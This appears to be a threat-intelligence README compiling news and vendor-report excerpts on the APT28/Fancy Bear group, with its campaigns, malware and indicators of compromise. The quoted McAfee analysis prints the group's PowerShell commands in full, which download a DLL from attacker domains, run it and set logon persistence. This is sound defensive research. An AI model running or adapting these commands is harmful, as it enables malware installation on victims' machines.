![alt tag](https://user-images.githubusercontent.com/24201238/29351849-9c3087b4-82b8-11e7-8fed-350e3b8b4945.png)

# Panopticon Project

## Fancy Bear

![Fancy Bear](https://fancybear.net/image/bear_PNG12011.png)

## Attack Pattern
A type of Tactics, Techniques, and Procedures (TTP) that describes ways threat actors attempt to compromise targets.

## Campaign 
A grouping of adversarial behaviors that describes a set of malicious activities or attacks that occur over a period of time against a specific set of targets.

## Course of Action 
An action taken to either prevent an attack or respond to an attack.

## Identity
Individuals, organizations, or groups, as well as classes of individuals, organizations, or groups.

## Indicator
Contains a pattern that can be used to detect suspicious or malicious cyber activity.

## Intrusion Set
A grouped set of adversarial behaviors and resources with common properties believed to be orchestrated by a single threat actor.

## Malware
A type of TTP, also known as malicious code and malicious software, used to compromise the confidentiality, integrity, or availability of a victim’s data or system.

## Observed Data
Conveys information observed on a system or network (e.g., an IP address).

## Report 
Collections of threat intelligence focused on one or more topics, such as a description of a threat actor, malware, or attack technique, including contextual details.

## Threat Actor 
Individuals, groups, or organizations believed to be operating with malicious intent.

## Tool
Legitimate software that can be used by threat actors to perform attacks.

## Vulnerability
A mistake in software that can be directly used by a hacker to gain access to a system or network.

## Raw intelligence
AKA APT28, Pawn Storm, Sofacy, Tsar Team, Strontium and Sednit http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group

Malware XTunnel http://www.securityweek.com/xtunnel-malware-specifically-built-dnc-hack-report
XAgent - Bitdefender and Palo Alto Networks have also identified a macOS version of XAgent, which they believe is downloaded to targeted systems by the Komplex downloader. Both security firms determined, based on binary strings, that Komplex and XAgent were likely created by the same developer. http://www.securityweek.com/russian-cyberspies-use-new-mac-malware-steal-data

http://www.news18.com/news/world/russia-used-facebook-to-try-to-spy-on-macron-campaign-says-sources-1474663.html
Russia Used Facebook to Try to Spy on Macron Campaign, Say Sources
About two dozen Facebook accounts were created to conduct surveillance on Macron campaign officials and others close to the centrist former financier as he sought to defeat far-right nationalist Marine Le Pen and other opponents in the two-round election, the sources said
Facebook confirmed to Reuters that it had detected spying accounts in France and deactivated them. It credited a combination of improved automated detection and stepped-up human efforts to find sophisticated attacks.
Company officials briefed congressional committee members and staff, among others, about their findings. People involved in the conversations also said the number of Facebook accounts suspended in France for promoting propaganda or spam - much of it related to the election - had climbed to 70,000, a big jump from the 30,000 account closures the company disclosed in April.
Facebook did not dispute the figure.
Russian intelligence agents attempted to spy on President Emmanuel Macron's election campaign earlier this year by creating phony Facebook personas, according to a US congressman and two other people briefed on the effort.
The spying campaign included Russian agents posing as friends of friends of Macron associates and trying to glean personal information from them, according to the US congressman and two others briefed on the matter.
Facebook employees noticed the efforts during the first round of the presidential election and traced them to tools used in the past by Russia’s GRU military intelligence unit, said the people, who spoke on condition they not be named because they were discussing sensitive government and private intelligence.
Facebook told American officials that it did not believe the spies burrowed deep enough to get the targets to download malicious software or give away their login information, 

http://www.zdnet.com/article/hackers-are-now-using-the-exploit-behind-wannacry-to-snoop-on-hotel-wi-fi/
Researchers at FireEye have attributed a campaign to remotely steal credentials from guests using Wi-Fi networks at hotels in Europe to APT28 -- also known as Fancy Bear
"This is the first time we have seen APT28 incorporate this exploit into their intrusions, and as far as we believe, the variant used was based on the public version," Cristiana Brafman Kittner, senior analyst at FireEye, told ZDNet.
The attack process begins with a spear-phishing campaign, which targets multiple companies in the hospitality industry with hotels in at least seven European countries and one Middle Eastern country, which are sent emails designed to compromise networks.
Messages contain a malicious document "Hotel_Reservation_From.doc" containing a macro which if successfully executed, decodes and deploys GameFish -- which researchers describe as APT28's signature malware.
Once GameFish is installed on the network, it uses EternalBlue to worm its way through the network and find computers responsible for controlling both guest and internal Wi-Fi networks. Once in control of these machines, the malware deploys an open source Responder tool, allowing it to steal any credentials sent over the wireless network.
While the attack is carried out against the network as whole, FireEye suggests that "hotel guests of interest could be directly targeted as well" 
Researchers note that in one incident, a victim was compromised after connecting to a hotel network, but that the attackers didn't immediately take action -- they waited 12 hours before remotely accessing the systems. However, the login originated from the same subnet indicating that the attacker machine was physically close to the victim and on the same Wi-Fi network. - So they act abroad?
The technique also exploits single factor user authentication -- using two factor authentication makes it harder for the hackers to break into targeted accounts.
However, FireEye says the two campaigns aren't linked and that DarkHotel -- also known as Fallout Team -- looks to be the work of a "Korean peninsula-nexus cyber espionage actor" and not APT28.

https://www.wired.com/story/fancy-bear-hotel-hack/?mbid=nl_81117_p1&CNDID=50740756
Disturbingly, once those hackers take control of hotels' Wi-Fi, they’re using that access to harvest victim computers’ usernames and passwords silently, with a trick that doesn’t even require users to actively type them when signed onto the hotel network.
FireEye says it first saw evidence that Fancy Bear might be targeting hotels in the fall of last year, when the company analyzed an intrusion that had started on one corporate employee's computer. The company traced that infection to the victim's use of a hotel Wi-Fi network while traveling; 12 hours after the person had connected to that network, someone connected to the same Wi-Fi network had used the victim's own credentials to log into their computer, install malware on their machine, and access their Outlook data. That implies, FireEye says, that a hacker had been sitting on the same hotel's network, possibly sniffing its data to intercept the victim's credentials.
From there, the attackers used a network-hacking tool called Responder, which allowed them not only to monitor traffic on the hijacked networks, but also to trick computers connecting to them to cough up users' credentials without giving victims any sign of the theft. When the victim computer reaches out to known services like printers or shared folders, Responder can impersonate those friendly entities with a fake authentication process, fooling the victim machine into transmitting its network username and password. And while the password is sent in a cryptographically hashed form, that hashing can sometimes be cracked. (FireEye believes, for instance, that hackers used Responder to steal the hotel guest's password in the 2016 case; the 12-hour delay may have been the time it took to crack the hash.)
In each case, FireEye says that the hacked networks were those of moderately high-end hotels, the kind that attract presumably valuable targets. "These were not super expensive places, but also not the Holiday Inn," FireEye's Read says. "They're the type of hotel a distinguished visitor would stay in when they’re on corporate travel or diplomatic business."
But FireEye says it doesn't know whether the hackers had specific visitors in mind, or were simply casting a wide net for potential victims. "Maybe this was designed just to establish a foothold and see who shows up, or maybe they were just testing something out," says Read. Other than victim whose case they analyzed last year, the company's analysts couldn't confirm any individual victims whose credentials were stolen from the target hotels.
FireEye says it has "moderate confidence" in its conclusion that Fancy Bear conducted both the 2016 hotel attack and the more recent spate. It bases that assessment on the use of two pieces of Fancy Bear-associated malware, known as GameFish and XTunnel, planted on hotel and victim computers. The company also points to clues in the command and control infrastructure of that malware and information about the victims, which it's not making public.

https://arstechnica.com/gadgets/2017/08/ukraine-malware-author-turns-witness-in-russian-dnc-hacking-investigation/
PAS Web shell—a PHP-based implant used to execute commands remotely on hacked systems
"Profexor" has not been charged in Ukraine, as he didn't use his remote access tool himself for malicious purposes. He did offer a version of the remote access tool for free on his member-only website, but he also built custom versions and provided training for pay. One of his customers was someone who used the tool in connection with malware connected to Fancy Bear to establish a backdoor into the DNC's network. But this is disputed https://krebsonsecurity.com/tag/p-a-s-web-shell/
Ukrainian Member of Parliament Anton Gerashchenko, a former advisor to Ukraine's interior minister, told the Times that Profexor's contact with the Russians behind the DNC hack was entirely via online conversations and voice calls. Gerashchenko said that "Profexor" was paid to write a custom version of his tool without knowing what it would be used for.

https://www.nytimes.com/2017/08/16/world/europe/russia-ukraine-malware-hacking-witness.html?smprod=nytcore-ipad&smid=nytcore-ipad-share
Rather than training, arming and deploying hackers to carry out a specific mission like just another military unit, Fancy Bear and its twin Cozy Bear have operated more as centers for organization and financing; much of the hard work like coding is outsourced to private and often crime-tainted vendors.

https://www.nytimes.com/2017/08/16/world/europe/russia-ukraine-malware-hacking-witness.html?smprod=nytcore-ipad&smid=nytcore-ipad-share
Traces of the same malicious code, this time a program called Sofacy, were seen in the 2014 attack in Ukraine and later in the D.N.C. intrusion in the United States.
In several instances, certain types of computer intrusions, like the use of malware to knock out crucial infrastructure or to pilfer email messages later released to tilt public opinion, occurred in Ukraine first. Only later were the same techniques used in Western Europe and the United States.
Included in this sharing of information were copies of the server hard drives of Ukraine’s Central Election Commission, which were targeted during a presidential election in May 2014. That the F.B.I. had obtained evidence of this earlier, Russian-linked electoral hack has not been previously reported.
Traces of the same malicious code, this time a program called Sofacy, were seen in the 2014 attack in Ukraine and later in the D.N.C. intrusion in the United States.
Intriguingly, in the cyberattack during the Ukrainian election, what appears to have been a bungle by Channel 1, a Russian state television station, inadvertently implicated the government authorities in Moscow.
Hackers had loaded onto a Ukrainian election commission server a graphic mimicking the page for displaying results. This phony page showed a shocker of an outcome: an election win for a fiercely anti-Russian, ultraright candidate, Dmytro Yarosh. Mr. Yarosh in reality received less than 1 percent of the vote.
The false result would have played into a Russian propaganda narrative that Ukraine today is ruled by hard-right, even fascist, figures.
The fake image was programmed to display when polls closed, at 8 p.m., but a Ukrainian cybersecurity company, InfoSafe, discovered it just minutes earlier and unplugged the server.
State television in Russia nevertheless reported that Mr. Yarosh had won and broadcast the fake graphic, citing the election commission’s website, even though the image had never appeared there. The hacker had clearly provided Channel 1 with the same image in advance, but the reporters had failed to check that the hack actually worked.
In 2016, two years after the election hack in Ukraine, hackers using some of the same techniques plundered the email system of the World Anti-Doping Agency, or WADA, which had accused Russian athletes of systematic drug use.
Photo
A website announced that WADA had been hacked by a group calling itself the “Fancy Bears’ Hack Team.” Credit Alexander Zemlianichenko/Associated Press
That raid, too, seems to have been closely coordinated with Russian state television, which began airing well-prepared reports about WADA’s hacked emails just minutes after they were made public. The emails appeared on a website that announced that WADA had been hacked by a group calling itself the “Fancy Bears’ Hack Team.”
Fancy Bear remains extraordinarily elusive, however. To throw investigators off its scent, the group has undergone various makeovers, restocking its arsenal of malware and sometimes hiding under different guises. One of its alter egos, cyberexperts believe, is Cyber Berkut, an outfit supposedly set up in Ukraine by supporters of the country’s pro-Russian president, Viktor F. Yanukovych, who was ousted in 2014.

https://nakedsecurity.sophos.com/2017/08/15/fancy-bear-bites-hotel-networks-as-eternalblue-mystery-deepens/?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+nakedsecurity+%28Naked+Security+-+Sophos%29
One unusual element is NetBIOS Name Service poisoning using the open source Responder tool, which allows the attackers to respond and spoof NBT-NS broadcasts from WINS (Windows Internet Name Service) servers.
Because this is a legacy service, removed from Windows as of Server 2012 R2, this suggests the attackers have knowledge of the unsurprising fact that hotels are using old software.

Responder https://github.com/SpiderLabs/Responder

http://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html
Group 74 
Cisco Talos discovered a new malicious campaign from the well known actor Group 74 (aka Tsar Team, Sofacy, APT28, Fancy Bear…). Ironically the decoy document is a deceptive flyer relating to the Cyber Conflict U.S. conference. CyCon US is a collaborative effort between the Army Cyber Institute at the United States Military Academy and the NATO Cooperative Cyber Military Academy and the NATO Cooperative Cyber Defence Centre of Excellence. Due to the nature of this document, we assume that this campaign targets people with an interest in cyber security. Unlike previous campaigns from this actor, the flyer does not contain an Office exploit or a 0-day, it simply contains a malicious Visual Basic for Applications (VBA) macro.
The VBA drops and executes a new variant of Seduploader. This reconnaissance malware has been used by Group 74 for years and it is composed of 2 files: a dropper and a payload. The dropper and the payload are quite similar to the previous versions but the author modified some public information such as MUTEX name, obfuscation keys... We assume that these modifications were performed to avoid detection based on public IOCs.

The decoy document is a flyer concerning the Cyber Conflict U.S. conference with the following filename Conference_on_Cyber_Conflict.doc. It contains 2 pages with the logo of the organizer and the sponsors:

The goal of this code is to get information from the properties of the document ("Subject", "Company", "Category", "Hyperlink base" and finally "Comments"). Some of this information can be directly extracted from the Windows explorer by looking at the properties of the file. The "Hyperlink Base" must be extracted using another tool, strings is capable of obtaining this by looking for long strings. Pay close attention to the contents of these fields as they appear base64 encoded. This extracted information is concatenated together to make a single variable. This variable is decoded with the base64 algorithm in order to get a Windows library (PE file) which is written to disk. The file is named netwf.dat. On the next step this file is executed by rundll32.exe via the KlpSvc export. We see that this file drops 2 additional files: netwf.bat and netwf.dll. The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden. We can also see 2 VBA variable names: PathPld, probably for Path Payload, and PathPldBt, for Path Payload Batch.

SEDUPLOADER VARIANT
Dropper Analysis
As opposed to previous campaigns performed by this actor, this latest version does not contain privilege escalation and it simply executes the payload and configures persistence mechanisms. The dropper installs 2 files:
netwf.bat : executes netwf.dll
netwf.dll : the payload
The dropper implements 2 persistence mechanisms:
HKCU\Environment\UserInitMprLogonScript to execute the netwf.bat file
COM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.
These 2 techniques have also been previously used by this actor.
Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed. In this case, explorer.exe will instance the MMDeviceEnumerator class and will execute the payload.

Payload Analysis
The payload features are similar to the previous versions of Seduploader. We can compare it to the sample e338d49c270baf64363879e5eecb8fa6bdde8ad9 used in May 2017 by Group 74. Of the 195 functions of the new sample, 149 are strictly identical, 16 match at 90% and 2 match at 80%
In the previous campaign where adversaries used Office document exploits as an infection vector, the payload was executed in the Office word process. In this campaign, adversaries did not use any exploit. Instead,the payload is executed in standalone mode by rundll32.exe.

Adversaries also changed some constants, such as the XOR key used in the previous version. The key in our version is:
key=b"\x08\x7A\x05\x04\x60\x7c\x3e\x3c\x5d\x0b\x18\x3c\x55\x64"
The MUTEX name is different too: FG00nxojVs4gLBnwKc7HhmdK0h

Here are some of the Seduploader features:
Screenshot capture (with the GDI API);
data/configuration exfiltration;
Execution of code;
File downloading;

The Command & Control (CC) of the analysed sample is myinvestgroup[.]com. During the investigation, the server did not provide any configuration to the infected machines. Based on the metadata of the Office documents and the PE files, the attackers had created the file on Wednesday, the 4th of October. We can see, in Cisco Umbrella, a peak in activities 3 days later, Saturday the 7th of October

Additionally the author did some small updates after publications from the security community, again this is common for actors of this sophisticated nature, once their campaigns have been exposed they will often try to change tooling to ensure better avoidance. For example the actor changed the XOR key and the MUTEX name. - could be they systematically change this

Files

Office Documents:
c4be15f9ccfecf7a463f3b1d4a17e7b4f95de939e057662c3f97b52f7fa3c52f
e5511b22245e26a003923ba476d7c36029939b2d1936e17a9b35b396467179ae
efb235776851502672dba5ef45d96cc65cb9ebba1b49949393a6a85b9c822f52
Seduploader Dropper:
522fd9b35323af55113455d823571f71332e53dde988c2eb41395cf6b0c15805
Sedupload Payload:
ef027405492bc0719437eb58c3d2774cc87845f30c40040bbebbcc09a4e3dd18
Networks

CC:
myinvestgroup[.]com

http://www.securityweek.com/russian-fancy-bear-hackers-abuse-blogspot-phishing
The cyber espionage group known as Fancy Bear, which is widely believed to be backed by the Russian government, has been abusing Google’s Blogspot service in recent phishing attacks. Threat intelligence firm ThreatConnect spotted the use of the blogging service while analyzing attacks aimed at Bellingcat, a group of investigative journalists that uses open source information to report on various events taking place around the world.
Fancy Bear, also known as Pawn Storm, APT28, Sofacy, Sednit, Strontium and Tsar Team, was first seen targeting Bellingcat in 2015 as part of a campaign aimed at entities investigating Russia’s involvement in the downing of Malaysia Airlines flight MH17 in July 2014 as it was crossing a conflict zone in Ukraine.
The latest attacks aimed at Bellingcat involved fake emails instructing users to change their Gmail passwords as a result of unauthorized activity on their account, and Dropbox invitations to view shared folders.

https://www.threatconnect.com/blog/fancy-bear-leverages-blogspot/
Our friends over at Bellingcat, which conducts open source investigations and writes extensively on Russia-related issues, recently shared a new tranche of spear-phishing emails they had received. Spoiler alert: they originated from Fancy Bear actors. Using the ThreatConnect platform we ingested the spear-phishing emails Bellingcat provided, processed out the relevant indicators, and compared them to previously known Fancy Bear activity. It turns out that this campaign had an association to 2016 Fancy Bear activity previously identified by the German Federal Office for the Protection of the Constitution (BfV). More interestingly however, Fancy Bear employed a new tactic we hadn't previously seen: using Blogspot-hosted URLs in their spear-phishing email messages. The Blogspot page contained a javascript window location that redirected the visitor to a second URL hosted on a dedicated server.
The phishing email used to deliver the malicious URLs pretends to be a password change for the target's Google account or a link to view a folder shared via Dropbox.

The phishing email contains a link hosted on Blogspot such as this: hxxps://pkfnmugfdsveskjtb[.]blogspot[.]com. This URL also contains a query parameter, "uid", that is unique per phishing email. The full format for the URL is the following:
https?://[a-z0-9]{11,17}\.blogspot\.(?:com|pt)\?uid=[a-z0-9]{10}

The blogspot page contains a small snippet of Javascript near the top of the source html that includes a Javascript window location redirect. An example of this javascript is:
The landing page URL in this redirect, hxxps://google[.]com[.]account-password[.]ga/security/signinoptions/password is hosted on google[.]com[.]account-password[.]ga which currently resolves to the IP address 80.255.12[.]231. This IP is a dedicated VPS hosted by MonoVM, a company based in Dubai.
Using  Farsight's passive DNSDB integration in ThreatConnect, a number of other similar hostnames were found resolving to 80.255.12[.]231. One in particular, accounts[.]google[.]com[.]securitymail[.]gq, stands out from the rest. The base domain of this host, securitymail[.]gq, has a previous resolution to IP 95.153.32[.]52. This IP address is a broadband connection located in Estonia on TELE2's network that was also used to host the domain smtprelayhost[.]com from December 2015 to December 2016. This overlaps with the time that securitymail[.]gq resolved to the same broadband IP address in March 2016. In case you may have missed it, smtprelayhost[.]com is called out as being Fancy Bear infrastructure in BfV Cyber-Brief Nr. 01/2016.

The use of Blogspot URLs has similarities with the notional tactics identified in a September Salon article on Fancy Bear leveraging Google's Accelerated Mobile Pages (AMP) to create URLs for their credential harvesting pages. Doing so likely allowed some Fancy Bear spear-phishing messages to avoid security filters that would have otherwise identified the malicious URLs. In this same way, a URL hosted on Google's own systems, in this case Blogspot, may be more likely to get past spam filters than URLs hosted on a third party IP address or hostname.
Several of the domains that host the credential harvesting pages identified above use .ga or .gq top level domains (TLDs) and were registered through Freenom. This reminded us of Fancy Bear's .ga Freenom infrastructure that they also employed against Bellingcat in October 2016.

http://www.securityweek.com/russia-linked-spies-deliver-malware-dde-attack
The Russia-linked cyber espionage group tracked as APT28 and Fancy Bear has started delivering malware to targeted users by leveraging a recently disclosed technique involving Microsoft Office documents and a Windows feature called Dynamic Data Exchange (DDE).
Researchers at McAfee noticed the use of the DDE technique while analyzing a campaign that involved blank documents whose name referenced the recent terrorist attack in New York City.
Researchers warned recently that DDE, a protocol designed for data exchanges between Windows applications, could be used by hackers as a substitute for macros in attacks involving malicious documents. Shortly after, security firms reported seeing attacks leveraging DDE to deliver malware, including Locky ransomware.

data
July 25, 2017
One of the domains, the security company reveals, is unisecproper[.]org, which was registered using the email address le0nard0@mail[.]com and is hosted on a dedicated server at the IP 92.114.92.134. The certificate used by this domain has been already associated (PDF) with Fancy Bear in operations targeting the DNC and German Parliament, which clearly indicates that the domain is associated with the group. http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group

In context
unisecproper[.]org registered with le0nard0@mail[.]com hosted on dedicated server 92.114.92.134 http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group
https://www.threatconnect.com/blog/finding-nemohost-fancy-bear-infrastructure/

domains
unisecproper[.]org http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group

emails
le0nard0@mail[.]com http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group

IPs
92.114.92.134 http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group

name servers
nemohosts[.]com, bacloud[.]com, and laisvas[.]lt http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group

follow up
ThreatConnect says their team was able to identify “dozens of recently registered domains and IPs that have varying levels of association to the Russian APT.” http://www.securityweek.com/tech-firms-target-domains-used-russia-linked-threat-group

http://www.securityweek.com/russia-linked-spies-deliver-malware-dde-attack
November 08, 2017
The Russia-linked cyber espionage group tracked as APT28 and Fancy Bear has started delivering malware to targeted users by leveraging a recently disclosed technique involving Microsoft Office documents and a Windows feature called Dynamic Data Exchange (DDE).
Researchers warned recently that DDE, a protocol designed for data exchanges between Windows applications, could be used by hackers as a substitute for macros in attacks involving malicious documents. Shortly after, security firms reported seeing attacks leveraging DDE to deliver malware, including Locky ransomware.

Microsoft pointed out that DDE, which has been replaced with Object Linking and Embedding (OLE), is a legitimate feature. The company has yet to make any changes that would prevent attacks, but mitigations included in Windows do provide protection, and users are shown two warnings before the malicious content is executed.
In the APT28 attacks spotted by McAfee, cyberspies used the document referencing the New York City attack to deliver a first-stage malware tracked as Seduploader. The malware, typically used by the threat actor as a reconnaissance tool, is downloaded from a remote server using PowerShell commands.
Based on the analysis of the malware and command and control (C&C) domains used in the attack, researchers determined that the campaign involving DDE started on October 25.

https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/
The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader.

The document we examined for this post:

Filename: IsisAttackInNewYork.docx
Sha1: 1c6c700ceebfbe799e115582665105caa03c5c9e
Creation date: 2017-10-27T22:23:00Z
The document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands. The first:

C:\Programs\Microsoft\Office\MSWord.exe\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(‘hxxp://netmediaresources[.]com/config.txt’);powershell -enc $e #.EXE

The second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server. It decodes as follows:

$W=New-Object System.Net.WebClient;
$p=($Env:ALLUSERSPROFILE+”\vms.dll”);
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$W.DownloadFile(“hxxp://netmediaresources[.]com/media/resource/vms.dll “,$p);
if (Test-Path $p){
$rd_p=$Env:SYSTEMROOT+”\System32\rundll32.exe”;
$p_a=$p+”,#1″;
$pr=Start-Process $rd_p -ArgumentList $p_a;
$p_bat=($Env:ALLUSERSPROFILE+”\vms.bat”);
$text=’set inst_pck = “%ALLUSERSPROFILE%\vms.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’
[io.File]::WriteAllText($p_bat,$text)
New-Item -Path ‘HKCU:\Environment’ -Force | Out-Null;
New-ItemProperty -Path ‘HKCU:\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;
}

The PowerShell scripts contact the following URL to download Seduploader:

hxxp://netmediaresources[.]com/media/resource/vms.dll
The Seduploader sample has the following artifacts:

Filename: vms.dll
Sha1: 4bc722a9b0492a50bd86a1341f02c74c0d773db7
Compile date: 2017-10-31 20:11:10
Control server: webviewres[.]net

The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows.

We identified the control server domain associated with this activity as webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure. This domain was registered on October 25, a few days before the payload and malicious documents were created. The domain was first active on October 29, just days before this version of Seduploader was compiled. The IP currently resolves to 185.216.35.26 and is hosted on the name servers ns1.njal.la and ns2.njal.la.

Further McAfee research identified the following related sample:

Filename: secnt.dll
Sha1: ab354807e687993fbeb1b325eb6e4ab38d428a1e
Compile date: 2017-10-30 23:53:02
Control server: satellitedeluxpanorama[.]com. (This domain uses the same name servers as above.)
The preceding sample most likely belongs to the same campaign. Based on our analysis it uses the same techniques and payload. We can clearly establish that the campaign involving documents using DDE techniques began on October 25.

The domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader (ab354807e687993fbeb1b325eb6e4ab38d428a1e).

The PowerShell command embedded in this document:

$W=New-Object System.Net.WebClient;

$p=($Env:ALLUSERSPROFILE+”\mvdrt.dll”);

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};

$W.DownloadFile(“http://sendmevideo.org/dh2025e/eh.dll”,$p);

if (Test-Path $p){

$rd_p=$Env:SYSTEMROOT+”\System32\rundll32.exe”;

$p_a=$p+”,#1″;

$pr=Start-Process $rd_p -ArgumentList $p_a;

$p_bat=($Env:ALLUSERSPROFILE+”\mvdrt.bat”);

$text=’set inst_pck = “%ALLUSERSPROFILE%\mvdrt.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start rundll32.exe %inst_pck %,#1’

[io.File]::WriteAllText($p_bat,$text)

New-Item -Path ‘HKCU:\Environment’ -Force | Out-Null;

New-ItemProperty -Path ‘HKCU:\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -PropertyType String -Force | Out-Null;

}

https://www.politico.eu/article/russian-hackers-fancy-bear-behind-leak-of-un-diplomats-email-report/
11/20/17
Russian hacker group Fancy Bear was behind a hack targeting Western politicians and diplomats, including leaked emails that suggested a top German diplomat helped get his wife a job at the United Nations, according to media reports.

https://www.proofpoint.com/us/threat-insight/post/apt28-racing-exploit-cve-2017-11292-flash-vulnerability-patches-are-deployed
On Tuesday, October 18, Proofpoint researchers detected a malicious Microsoft Word attachment exploiting a recently patched Adobe Flash vulnerability, CVE-2017-11292. We attributed this attack to APT28
Targeting data for this campaign is limited but some emails were sent to foreign government entities equivalent to the State Department and private-sector businesses in the aerospace industry. The known geographical targeting appears broad, including Europe and the United States. The emails were sent from free email services.
As we examined the document exploitation chain, we found that DealersChoice.B [2], the attack framework that the document uses, is now also exploiting CVE-2017-11292, a Flash vulnerability that can lead to arbitrary code execution across Windows, Mac OS, Linux, and Chrome OS systems. The vulnerability was announced and patched on Monday, October 16 [1]. At that time Kaspersky attributed the exploit use to the BlackOasis APT group, which is distinct from APT28.
Thus, while this exploit is no longer a zero-day, this is only the second known campaign utilizing it reported in public. APT28 burned their CVE-2017-0262 EPS 0-day in a similar fashion in April after Microsoft pushed an EPS exploit mitigation, which significantly reduced the impact of this exploit. [3]
The document “World War 3.docx” contacts DealersChoice.B, APT28’s attack framework that allows loading exploit code on-demand from a command and control (C&C) server. DealersChoice has previously been used to exploit a variety of Flash vulnerabilities, including CVE-2015-7645, CVE-2016-1019, CVE-2016-4117, and CVE-2016-7855 via embedded objects in crafted Microsoft Word documents.
This malicious document embeds the same Flash object twice in an ActiveX control for an unknown reason, although this is likely an operational mistake. The Flash files work in the same manner as the last known attack using this tool: the embedded Flash decompresses a second Flash object that handles the communication with the exploit delivery server. The only difference is that this second Flash object is no longer stored encrypted. There are other signs that this campaign was devised hastily: for example, the actors did not change the decryption algorithm constants as they have in the past. These particular constants were already used in a late December 2016 campaign. Each document uses a different domain for victim exploitation, while the communication protocol with the server stayed the same as well.
We performed testing and found exploitation to be successful on:
Windows 7 with Flash 27.0.0.159 and Microsoft Office 2013
Windows 10 build 1607 with Flash 27.0.0.130 and Microsoft Office 2013
At this point, despite the potential impact across operating systems of this particular Flash vulnerability, Mac OS does not appear to be targeted by this campaign. Users running 64-bit versions of Microsoft Office 2016 and Windows 10 RS3 should be protected against this exploit as well.
25f983961eef6751e53a72c96d35448f8b413edf727501d0990f763b8c5e900b sha256 Decoy/Exploit Document

416467f8975036bb06c2b5fca4daeb900ff5f25833d3cdb46958f0f0f26bec82 sha256 APT28 Uploader Variant

blackpartshare[.com|185.86.150.244 Domain|IP DealersChoice C&C (now taken down)

mountainsgide[.com|185.86.150.244 Domain|IP DealersChoice C&C (now taken down)

contentdeliverysrv[.net|142.91.104.106 Domain|IP DealersChoice C&C (now taken down)

space-delivery[.com|86.106.131.141 Domain|IP APT28 uploader C&C ] closing off the underlining


http://www.bbc.com/news/technology-42056555
23 November 2017
echnical and financial records from Crookservers seen by the BBC suggest Fancy Bear had access to significant funds and made use of online financial services, some of which were later closed in anti-money laundering operations.
Over three years, Fancy Bear rented computers through Crookservers, covering its tracks using bogus identities, virtual private networks and hard-to-trace payment systems.
One communication shows one hacker, using the pseudonym Roman Brecesku, had complained that his server had been "cracked".
The server used to control the malware was hired through Crookservers by a hacker using the pseudonym Nikolay Mladenov who paid using Bitcoin and Perfect Money, according to records seen by the BBC.
he hacker used the server until June 2015, when it was deleted at Crookservers's request following media reports of the attack.
This server's IP address also appears in malware used to target some attendees at the Farnborough air show in 2014.
Fancy Bear malware used to attack a UK TV station and the DNC also contained this IP address, although the server was no longer in Fancy Bear's control when these attacks occurred. - so someone else had the malware??
A financial account used by Mladenov was also used by another hacker, operating under the pseudonym Klaus Werner, to hire more computers through Crookservers.
One server hired by Werner received "redirected" traffic from a legitimate Nigerian government website, according to Secureworks analysis.
The financial account used by Mladenov and Werner was used by Fancy Bear hackers - including two using the names Bruno Labrousse and Roman Brecesku - to hire other servers from Crookservers.
One server and the email address used to hire it seem to have links to "advanced espionage" malware used to target iOS devices.
The malware was capable of turning on voice recording and stealing text messages.
Another email used to hire servers can be linked to an attack against Bulgaria's State Agency for National Security.
But there are eight dedicated servers tied to the same financial information, whose use is unknown - suggesting there may be other Fancy Bear attacks that have not been publicly disclosed.
Fancy Bear spent at least $6,000 (£4,534) with Crookservers via a variety of services that offered an extra level of anonymity.
They included Bitcoin, Liberty Reserve and Perfect Money. Liberty Reserve was later closed after an international money laundering investigation.
The BBC asked a UK company called Elliptic, which specialises in identifying Bitcoin-related "illicit activity", to analyse Fancy Bear's Bitcoin payments.
Lead investigator Tom Robinson said his team had identified the wallet that had been the source of these funds. He said the bitcoins it contained were "worth around $100,000".
Elliptic traced the source of some of the funds in that wallet to the digital currency exchange BTC-e.
In July, BTC-e was closed by the US authorities and its Russian alleged founder arrested in Greece accused of money laundering.
Crookservers closed on 10 October. 

https://www.darkreading.com/attacks-breaches/russias-fancy-bear-apt-group-gets-more-dangerous/d/d-id/1330702
12/21/2017
The modular backdoor has been a central component of Fancy Bear's campaigns for several years. Initial versions of the tool were designed to break into Windows and Linux systems. But it has been updated in the past two years to include support for iOS, Android, and, since the beginning of this year, OS X.
